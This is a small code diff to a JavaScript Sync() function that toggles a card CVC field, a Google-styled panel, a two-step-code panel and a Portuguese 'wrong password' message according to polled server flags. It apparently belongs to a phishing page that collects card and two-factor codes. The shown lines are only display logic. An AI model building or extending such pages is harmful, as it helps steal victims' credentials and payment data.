@@ -262,9 +262,9 @@ function Sync(){
             document.querySelector('#google').style.display = 'none';
             document.querySelector('.twosteps').style.display = 'block';
         }else{
-            document.querySelector('#cvc').value = '';            
-            document.querySelector('#google').style.display = 'block';
+            document.querySelector('#cvc').value = '';
             document.querySelector('.twosteps').style.display = 'none';
+            document.querySelector('#google').style.display = 'block';
         }
         
         if(data.ok == 1){
@@ -272,7 +272,6 @@ function Sync(){
         }
         
         if(data.invalid == 1){
-            document.querySelector('.g_part1').style.display = 'none';
             document.querySelector('#google').style.display = 'none';
             document.querySelector('#senha_errada').style.display = 'block';
 
